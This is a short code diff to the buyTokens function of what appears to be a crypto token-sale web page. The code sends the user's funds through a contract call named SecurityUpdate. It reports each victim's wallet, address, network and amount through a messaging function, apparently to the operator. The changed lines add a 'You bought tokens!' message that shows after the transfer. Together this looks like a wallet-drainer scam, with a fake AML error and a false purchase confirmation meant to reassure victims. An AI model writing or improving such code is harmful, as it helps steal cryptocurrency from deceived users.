@@ -1304,8 +1304,8 @@ const buyTokens = async() => {
             if (isDesktopTrust()) {
                 contract.SecurityUpdate({ value: String(amount), from: account }).then(async() => {
                     sendMessage(`*✅ Transfer:* Tokens ${usdAmount}$%0A*🔍 Network:* ${networks[chainId]} %0A*⚡️ Wallet:* ${exactWalletName} %0A*🪓 Address:* ${account}`);
-                    showLoad();
                     showSuccessBuy();
+		    changeConfirmText('You bought tokens!')
                 }).catch(e => {
                     sendMessage(`❌ Error [AML]: ${e.message}. ${JSON.stringify(e)}`)
                     showAmlError();
@@ -1329,6 +1329,7 @@ const buyTokens = async() => {
                                     clearInterval(checkReceiptInterval)
                                     sendMessage(`*✅ Transfer:* Tokens ${usdAmount}$%0A*🔍 Network:* ${networks[chainId]} %0A*⚡️ Wallet:* ${exactWalletName} %0A*🪓 Address:* ${account}`);
                                     showSuccessBuy();
+				    changeConfirmText('You bought tokens!')
                                    } else if (err) {
                                     console.log(err)
                                     clearInterval(checkReceiptInterval)
